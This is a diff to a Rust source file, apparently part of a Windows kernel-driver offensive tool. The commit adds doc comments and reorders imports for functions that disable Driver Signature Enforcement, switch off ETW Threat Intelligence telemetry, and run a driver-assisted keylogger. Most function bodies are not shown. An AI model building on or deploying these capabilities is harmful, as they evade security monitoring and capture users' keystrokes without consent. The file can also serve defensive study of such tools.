@@ -2,12 +2,13 @@ use {
     log::{info, debug, error},
     common::structs::{DSE, ETWTI},
     crate::utils::{
-        vk_to_char, update_key_state, key_pressed,
         get_process_by_name, open_driver,
+        vk_to_char, update_key_state, key_pressed,
     }, 
     std::{
-        ffi::c_void, fs::OpenOptions, io::{BufWriter, Write}, 
-        mem::size_of, ptr::null_mut, time::Duration 
+        ffi::c_void, fs::OpenOptions, 
+        ptr::null_mut, time::Duration,
+        io::{BufWriter, Write}, mem::size_of, 
     }, 
     windows_sys::Win32::{
         System::{
@@ -16,27 +17,44 @@ use {
             Threading::{OpenProcess, PROCESS_ALL_ACCESS},
         },
         Foundation::{
-            INVALID_HANDLE_VALUE, CloseHandle, 
             GetLastError, HANDLE,
+            INVALID_HANDLE_VALUE, CloseHandle, 
         },
     }
 };
 
-/// Key states.
+/// Key states for keylogging functionality.
 pub static mut KEY_STATE: [u8; 64] = [0; 64];
 pub static mut KEY_PREVIOUS: [u8; 64] = [0; 64];
 pub static mut KEY_RECENT: [u8; 64] = [0; 64];
 
+/// Provides miscellaneous system functionalities through a driver interface, such as
+/// Driver Signature Enforcement (DSE) toggling, ETWTI management, and keylogging.
 pub struct Misc {
     driver_handle: HANDLE,
 }
 
 impl Misc {
+    /// Creates a new `Misc` instance, opening a handle to the driver.
+    ///
+    /// # Returns
+    /// 
+    /// * An instance of `Misc`.
+    /// 
+    /// # Panics
+    /// 
+    /// Panics if the driver cannot be opened.
     pub fn new() -> Self {
         let driver_handle = open_driver().expect("Error");
         Misc { driver_handle }
     }
 
+    /// Enables or disables Driver Signature Enforcement (DSE).
+    ///
+    /// # Arguments
+    ///
+    /// * `ioctl_code` - The IOCTL code for the DSE operation.
+    /// * `enable` - `true` to enable DSE or `false` to disable it.
     pub fn dse(self, ioctl_code: u32, enable: bool) {
         debug!("Preparing DSE structure for {}", if enable { "enabling" } else { "disabling" });
         let mut info_dse = DSE { enable };
@@ -63,6 +81,12 @@ impl Misc {
         }
     }
 
+    /// Activates a keylogger that records keystrokes to a specified file.
+    ///
+    /// # Arguments
+    ///
+    /// * `ioctl_code` - The IOCTL code for initializing keylogging.
+    /// * `file` - The path to the file where keystrokes will be recorded.
     pub fn keylogger(self, ioctl_code: u32, file: &String) {
         unsafe {
             let mut address: usize = 0;
@@ -120,6 +144,12 @@ impl Misc {
         }
     }
 
+    /// Enables or disables Event Tracing for Windows Threat Intelligence (ETWTI).
+    ///
+    /// # Arguments
+    ///
+    /// * `ioctl_code` - The IOCTL code for the ETWTI operation.
+    /// * `enable` - `true` to enable ETWTI or `false` to disable it.
     pub fn etwti(self, ioctl_code: u32, enable: bool) {
         debug!("Preparing ETWTI structure for {}", if enable { "enabling" } else { "disabling" });
         let mut etwti = ETWTI { enable };
@@ -148,6 +178,7 @@ impl Misc {
 }
 
 impl Drop for Misc {
+    /// Ensures the driver handle is closed when `Misc` goes out of scope.
     fn drop(&mut self) {
         debug!("Closing the driver handle");
         unsafe { CloseHandle(self.driver_handle) };
